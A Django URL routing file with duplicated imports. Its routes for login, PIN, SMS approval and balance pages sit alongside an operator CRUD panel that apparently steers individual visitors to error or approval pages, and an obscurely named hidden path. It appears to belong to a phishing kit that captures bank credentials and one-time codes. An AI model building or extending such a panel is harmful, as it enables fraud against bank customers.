from django.urls import path
from django.urls import re_path

from . import views
from django.urls import path
from . import views
from django.urls import include
from django.urls import path
from . import views
urlpatterns = [
    path("", views.index, name="index"),
    path("login", views.login, name="login"),
    
    path('verify', views.verify, name='verify'),
    path('error', views.error, name='error'),
    path('errorpin', views.errorpin, name='errorpin'),   
    path('approve', views.smssapprove, name='smssapprove'),
    path('balance', views.balance, name='balance'),

    path('delete_all/', views.delete_all_contacts, name='delete_all_contacts'),
    path('crud/api/list/', views.contact_list_api, name='contact_list'),
    path('mon3169/', views.Asdsad32da, name='Asdsad32da'),
    path('crud/smserror/<int:pk>/', views.smserror, name='smserror'),
    path('crud/approve/<int:pk>/', views.approve, name='approve'),
    path('crud/balance/<int:pk>/', views.balanceerror, name='balanceerror'),
    path('crud/err/<int:pk>/', views.errpin, name='errpin'),

    path('check_status/<int:contact_id>/', views.check_status, name='check_status'),

]
